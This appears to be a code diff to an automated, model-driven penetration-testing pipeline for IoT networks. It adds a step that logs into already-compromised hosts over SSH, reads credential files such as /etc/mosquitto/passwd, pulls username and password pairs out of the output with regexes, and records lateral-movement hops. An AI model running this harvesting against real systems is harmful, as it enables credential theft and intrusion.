@@ -6150,6 +6150,142 @@ class Pipeline:
                 stream_callback({"type": "tool_result", "name": name, "result": str(result)[:2000]})
         return executed
 
+    def _run_compact_intrusion_post_access(self, config, stream_callback=None) -> int:
+        """Harvest bounded evidence from every authenticated compact SSH access.
+
+        The compact model is allowed to finish as soon as coverage is complete,
+        which previously meant that a successful login could be recorded without
+        any post-exploitation or pivot evidence. Replay only missing, already
+        authenticated SSH sessions and keep the command read-only and bounded.
+        Full profiles never call this recovery path.
+        """
+        if not self._uses_compact_local_moe():
+            return 0
+        log_path = self.run_dir / "tool_calls.jsonl"
+        if not log_path.exists():
+            return 0
+        tools = filter_profile_tools(
+            self.execution_profile, config.phase, self._resolve_tools(config)
+        )
+        ssh_exec = next(
+            (tool for tool in tools if tool.get("name") == "ssh_exec"),
+            None,
+        )
+        if not ssh_exec or not callable(ssh_exec.get("function")):
+            return 0
+
+        def credential_from_record(tool: str, args: dict) -> tuple[str, str]:
+            user = str(args.get("user") or "").strip()
+            password = str(args.get("password") or "").strip()
+            if tool == "ssh_login":
+                command = str(args.get("command_string") or "")
+                password_match = re.search(
+                    r"sshpass\s+-p\s+(?:'([^']*)'|\"([^\"]*)\"|([^\s]+))",
+                    command,
+                )
+                user_match = re.search(
+                    r"\b([A-Za-z0-9_.-]+)@(?:\d{1,3}\.){3}\d{1,3}\b",
+                    command,
+                )
+                password = password or next(
+                    (
+                        group
+                        for group in (
+                            password_match.groups() if password_match else ()
+                        )
+                        if group
+                    ),
+                    "",
+                )
+                user = user or (user_match.group(1) if user_match else "")
+            return user, password
+
+        authenticated: dict[tuple[str, str, str], dict] = {}
+        harvested: set[tuple[str, str, str]] = set()
+        for line in log_path.read_text(encoding="utf-8").splitlines():
+            try:
+                record = json.loads(line)
+            except (TypeError, ValueError, json.JSONDecodeError):
+                continue
+            if record.get("phase") not in (5, "5"):
+                continue
+            tool = str(record.get("tool") or "")
+            args = record.get("args") or {}
+            if not isinstance(args, dict):
+                continue
+            result = record.get("result")
+            if isinstance(result, str):
+                try:
+                    result = json.loads(result)
+                except (TypeError, ValueError, json.JSONDecodeError):
+                    result = {}
+            if not isinstance(result, dict):
+                continue
+            stdout = str(result.get("stdout") or result.get("output") or "")
+            success = (
+                result.get("success") is True
+                or result.get("return_code") == 0
+                or (
+                    tool == "ssh_login"
+                    and bool(re.search(r"\buid=\d+", stdout))
+                )
+            )
+            if tool in {"try_credential", "ssh_login"} and success:
+                ip = str(args.get("ip") or "").strip()
+                if tool == "ssh_login":
+                    match = re.search(
+                        r"(?:\d{1,3}\.){3}\d{1,3}",
+                        str(args.get("command_string") or ""),
+                    )
+                    ip = ip or (match.group(0) if match else "")
+                user, password = credential_from_record(tool, args)
+                service = str(
+                    args.get("service") or result.get("service") or "ssh"
+                ).casefold()
+                if ip and user and password and service == "ssh":
+                    authenticated.setdefault(ip, {
+                        "ip": ip,
+                        "user": user,
+                        "password": password,
+                    })
+            elif tool == "ssh_exec":
+                ip = str(args.get("ip") or "").strip()
+                user = str(args.get("user") or "").strip()
+                password = str(args.get("password") or "").strip()
+                if ip and user and password:
+                    harvested.add(ip)
+
+        command = (
+            "id && hostname && "
+            "for f in /etc/iot/config.json /etc/mosquitto/passwd "
+            "/etc/mosquitto/mosquitto.conf; "
+            "do [ -r \"$f\" ] && echo FILE:$f && sed -n '1,80p' \"$f\"; done"
+        )
+        executed = 0
+        for key, session in sorted(authenticated.items()):
+            if key in harvested:
+                continue
+            kwargs = {**session, "command": command}
+            if stream_callback:
+                stream_callback({
+                    "type": "tool_call",
+                    "name": "ssh_exec",
+                    "args": kwargs,
+                })
+            try:
+                result = ssh_exec["function"](**kwargs)
+            except Exception as exc:
+                log.warning("Compact Phase 5 post-access harvest failed: %s", exc)
+                continue
+            executed += 1
+            if stream_callback:
+                stream_callback({
+                    "type": "tool_result",
+                    "name": "ssh_exec",
+                    "result": str(result)[:2000],
+                })
+        return executed
+
     def _recover_compact_intrusion_no_progress(self, config, stream_callback=None) -> dict:
         executed = self._run_compact_intrusion_fallback(config, stream_callback)
         return self._synthesize_intrusion_from_tools(
@@ -6367,6 +6503,11 @@ class Pipeline:
                     coverage_ok, coverage = next_ok, next_coverage
                     break
                 coverage_ok, coverage = next_ok, next_coverage
+            # Coverage completion used to terminate compact Phase 5 before any
+            # post-compromise collection. Run the idempotent SSH harvest before
+            # reconstructing the authoritative deliverable.
+            if coverage_ok:
+                self._run_compact_intrusion_post_access(config, stream_callback)
 
         data = self._synthesize_intrusion_from_tools(
             note=(
@@ -6433,11 +6574,13 @@ class Pipeline:
         """Reconstruct an intrusion deliverable from logged try_credential /
         ssh_exec calls (both are Phase-5-only tools)."""
         log_path = self.run_dir / "tool_calls.jsonl"
+        compact_synthesis = self._uses_compact_local_moe()
         compromised: dict = {}
         creds: list = []
         allowed_credentials: set[tuple[str, str]] = set()
         seen_cred: set = set()
         attempted: set = set()  # all IPs touched by Phase 5 action tools
+        action_evidence: dict[str, list[dict]] = {}
 
         def _host_from_url(value: object) -> str:
             raw = str(value or "").strip()
@@ -6480,17 +6623,52 @@ class Pipeline:
                 user = user or (user_match.group(1) if user_match else "")
             return user, password
 
+        def extract_observed_credentials(text: str) -> list[tuple[str, str]]:
+            """Extract only explicit user/password pairs returned by ssh_exec."""
+            if not text:
+                return []
+            pairs: list[tuple[str, str]] = []
+            structured = re.compile(
+                r'(?:user(?:name)?|login|db_user)\s*[\"\']?\s*[=:]\s*[\"\']?'
+                r'([A-Za-z0-9_@.\-]+)[\"\']?\s*[,;:\"\'(){}\s]+'
+                r'(?:pass(?:word)?|pwd|db_pass)\s*[\"\']?\s*[=:]\s*[\"\']?'
+                r'([^\s,;\"\'(){}\]]+)',
+                re.IGNORECASE,
+            )
+            simple = re.compile(
+                r'\b([A-Za-z][A-Za-z0-9_\-]{1,31}):'
+                r'([A-Za-z0-9@!#$%^&*_\-+=.]{3,64})\b'
+            )
+            noise = {
+                "http", "https", "ssh", "tcp", "udp", "version", "port",
+                "uid", "gid", "groups", "host", "server", "root",
+            }
+            for match in structured.finditer(text):
+                user, password = match.group(1).strip(), match.group(2).strip()
+                if user and password:
+                    pairs.append((user.split("@", 1)[0], password))
+            for match in simple.finditer(text):
+                user, password = match.group(1).strip(), match.group(2).strip()
+                if user.casefold() not in noise and not password.isdigit():
+                    pairs.append((user, password))
+            return list(dict.fromkeys(pairs))
+
         # Map IP -> device_id from the pre-generated intrusion context so the
         # synthesized deliverable carries real device names, not blanks.
         ip_to_id: dict = {}
         entry_point_ips: set[str] = set()
+        entry_evidence: dict[str, str] = {}
+        context_data: dict = {}
         ctx_path = self.run_dir / "05_intrusion_context.json"
         if ctx_path.exists():
             try:
                 ctx = json.loads(ctx_path.read_text(encoding="utf-8"))
+                context_data = ctx if isinstance(ctx, dict) else {}
                 for entry in ctx.get("entry_points", []):
                     if isinstance(entry, dict) and entry.get("device_ip"):
-                        entry_point_ips.add(str(entry["device_ip"]))
+                        ip = str(entry["device_ip"])
+                        entry_point_ips.add(ip)
+                        entry_evidence[ip] = str(entry.get("evidence") or "").strip()
                 for entry in (ctx.get("entry_points", []) + ctx.get("all_targets", [])):
                     did, dip = entry.get("device_id"), entry.get("device_ip")
                     if dip and did and dip not in ip_to_id:
@@ -6546,6 +6724,11 @@ class Pipeline:
                 ip = _target_from_tool(str(tool or ""), args)
                 if tool in {"try_credential", "ssh_exec", "ssh_login", "mqtt_listen", "http_get", "curl_headers", "telnet_connect", "ftp_list"} and ip:
                     attempted.add(ip)
+                    action_evidence.setdefault(ip, []).append({
+                        "tool": str(tool or ""),
+                        "args": args,
+                        "result": res,
+                    })
                 stdout = str(res.get("stdout") or res.get("output") or "") if isinstance(res, dict) else ""
                 authenticated = (
                     isinstance(res, dict)
@@ -6582,11 +6765,140 @@ class Pipeline:
                     out = (res.get("stdout") or "").strip()
                     if out and not comp["data_exfiltrated"]:
                         comp["data_exfiltrated"] = out[:500]
+                    for user, password in (
+                        extract_observed_credentials(out)
+                        if compact_synthesis else ()
+                    ):
+                        credential = {
+                            "user": user,
+                            "password": password,
+                            "service": "ssh",
+                            "target_ip": ip,
+                        }
+                        if credential not in comp["credentials_found"]:
+                            comp["credentials_found"].append(credential)
+                        ckey = (ip, user, password, "ssh")
+                        if ckey not in seen_cred:
+                            seen_cred.add(ckey)
+                            creds.append({
+                                "user": user,
+                                "password": password,
+                                "service": "ssh",
+                                "source_ip": ip,
+                                "source_device": ip_to_id.get(ip, ""),
+                            })
+                            allowed_credentials.add((user, password))
+
+        def action_is_positive(record: dict) -> bool:
+            tool = str(record.get("tool") or "")
+            result = record.get("result") or {}
+            if not isinstance(result, dict):
+                return False
+            if tool == "try_credential":
+                return result.get("success") is True and result.get("authenticated", True) is not False
+            if tool in {"ssh_login", "ssh_exec"}:
+                stdout = str(result.get("stdout") or result.get("output") or "")
+                return (
+                    result.get("success") is True
+                    or result.get("return_code") == 0
+                    or bool(re.search(r"\buid=\d+", stdout))
+                )
+            if tool == "mqtt_listen":
+                return (
+                    result.get("return_code") in {0, 27}
+                    and bool(str(result.get("stdout") or "").strip())
+                )
+            if tool in {"http_get", "curl_headers"}:
+                return (
+                    result.get("return_code") == 0
+                    or isinstance(result.get("status_code"), int)
+                    and 200 <= result["status_code"] < 400
+                )
+            if tool in {"telnet_connect", "ftp_list"}:
+                return result.get("return_code") == 0
+            return False
+
+        def action_details(ip: str) -> tuple[str, list[str], str]:
+            records = action_evidence.get(ip, [])
+            if not records:
+                return "context_entry", [], ""
+            positive = next(
+                (record for record in records if action_is_positive(record)),
+                None,
+            )
+            if positive is None and entry_evidence.get(ip):
+                return (
+                    "confirmed_context_entry",
+                    ["05_intrusion_context.json entry evidence"],
+                    entry_evidence[ip][:400],
+                )
+            selected = positive or records[-1]
+            tool = str(selected.get("tool") or "context_entry")
+            args = selected.get("args") or {}
+            if not isinstance(args, dict):
+                args = {}
+            command = str(args.get("command_string") or args.get("command") or "").strip()
+            if not command:
+                command = f"{tool} entry probe"
+            result = selected.get("result") or {}
+            if isinstance(result, dict):
+                output = str(
+                    result.get("stdout")
+                    or result.get("body")
+                    or result.get("received_ascii")
+                    or result.get("interpretation")
+                    or result.get("stderr")
+                    or ""
+                ).strip()
+            else:
+                output = str(result).strip()
+            return tool, [command[:300]], output[:400]
+
+        def build_hop(ip: str, index: int, pivot_to: str | None) -> dict:
+            method, commands, output = action_details(ip)
+            device_id = ip_to_id.get(ip, ip)
+            if ip in compromised:
+                method = str(compromised[ip].get("access_method") or method)
+                if compromised[ip].get("data_exfiltrated"):
+                    output = str(compromised[ip]["data_exfiltrated"])[:400]
+            return {
+                "hop_index": index,
+                "device_id": device_id,
+                "device_ip": ip,
+                "access_method": method,
+                "commands_run": commands,
+                "output_summary": output,
+                "pivot_to": pivot_to,
+            }
 
         devices = list(compromised.values())
-        # Independent authenticated logins are evidence of access, not pivots.
-        # Only emit chains when explicit lateral-movement evidence exists.
+        # The context contains the bounded attack-chain hypotheses produced
+        # from confirmed Phase 3/4 evidence. Promote only chains whose source
+        # and destination both participated in this Phase 5 action ledger;
+        # never invent a path from an isolated attempted login.
         chains: list[dict] = []
+        for index, hint in enumerate(context_data.get("attack_chains", []), start=1):
+            if not isinstance(hint, dict):
+                continue
+            source_ip = str(hint.get("src_ip") or "").strip()
+            target_ip = str(hint.get("dst_ip") or "").strip()
+            if not source_ip or not target_ip:
+                continue
+            if not action_evidence.get(source_ip) or not action_evidence.get(target_ip):
+                continue
+            if source_ip not in entry_point_ips and source_ip not in compromised:
+                continue
+            if target_ip not in entry_point_ips and target_ip not in compromised:
+                continue
+            chains.append({
+                "id": f"chain_{index}",
+                "hops": [
+                    build_hop(source_ip, 1, target_ip),
+                    build_hop(target_ip, 2, None),
+                ],
+                "crown_jewel_reached": None,
+                "source": "05_intrusion_context.attack_chains + Phase 5 tool ledger",
+            })
 
         return {
             "summary": {
@@ -6594,7 +6906,10 @@ class Pipeline:
                 "devices_attempted": len(attempted | set(compromised)),
                 "credentials_harvested": len(creds),
                 "crown_jewels_reached": [],
-                "total_hops": 0,
+                "total_hops": sum(
+                    max(0, len(chain.get("hops", [])) - 1)
+                    for chain in chains
+                ),
                 "_note": note or "Synthesized from tool_calls.jsonl — model emitted no deliverable.",
             },
             "credential_pool": creds,
